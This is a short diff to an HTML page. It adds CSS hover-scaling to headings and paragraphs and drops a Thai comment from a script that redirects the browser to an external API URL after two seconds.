@@ -21,6 +21,14 @@
       padding: 2rem;
     }
 
+    h1, h2, p {
+      transition: transform 0.3s ease;
+    }
+
+    h1:hover, h2:hover, p:hover {
+      transform: scale(1.05);
+    }
+
     h1 {
       font-size: 3rem;
       font-weight: bold;
@@ -110,7 +118,7 @@
 
       setTimeout(() => {
         window.location.href = 'https://api.xzrn.xyz/api/exp.php';
-      }, 2000); // รอ 2 วินาที ก่อน redirect
+      }, 2000);
     });
   </script>
 </body>
